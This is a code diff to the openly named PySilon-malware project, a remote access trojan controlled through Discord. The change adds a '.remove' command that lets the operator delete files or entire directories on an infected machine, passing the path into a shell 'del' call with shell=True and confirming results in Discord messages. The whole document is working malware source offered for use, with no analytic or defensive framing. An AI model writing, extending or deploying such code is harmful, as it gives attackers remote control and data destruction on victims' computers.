@@ -1,4 +1,5 @@
 import resources.modules.misc as pysilon_misc
+from shutil import copy2, rmtree
 from bs4 import BeautifulSoup
 from zipfile import ZipFile
 from getpass import getuser
@@ -266,3 +267,36 @@ async def print_working_directory(ctx):
     embed = discord.Embed(title=f"🟣 System",description=f"Current directory: `{'/'.join(working_directory)}`", colour=discord.Colour.purple())
     embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
     await ctx.send(embed=embed)
+
+@client.command(name="remove")
+async def remove_files(ctx, argument): 
+    await ctx.message.delete()
+
+    async def remove_file_func(ctx, argument):
+        try:
+            if os.path.isfile(argument):
+                argument = argument.replace('/', '\\')
+                subprocess.run('del "' + argument + '"', shell=True)
+            else:
+                rmtree(argument)
+
+            embed = discord.Embed(title="🟢 Success",description=f'```Successfully removed `{argument}`.```', colour=discord.Colour.green())
+            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+            await ctx.send(embed=embed)
+
+        except Exception as e:
+            embed = discord.Embed(title="📛 Error",description=f'`' + str(e) + '`', colour=discord.Colour.red())
+            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+            await ctx.send(embed=embed)
+
+    if argument != None:
+        if os.path.exists('/'.join(working_directory) + '/' + argument): await remove_file_func(ctx, '/'.join(working_directory) + '/' + argument)
+        elif os.path.exists(argument): await remove_file_func(ctx, argument)
+        else:
+            embed = discord.Embed(title="📛 Error",description=f'```File or directory not found.```', colour=discord.Colour.red())
+            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+            await ctx.send(embed=embed)
+    else:
+        embed = discord.Embed(title="📛 Error",description=f'```Syntax: .remove <file-or-directory>```', colour=discord.Colour.red())
+        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+        await ctx.send(embed=embed)
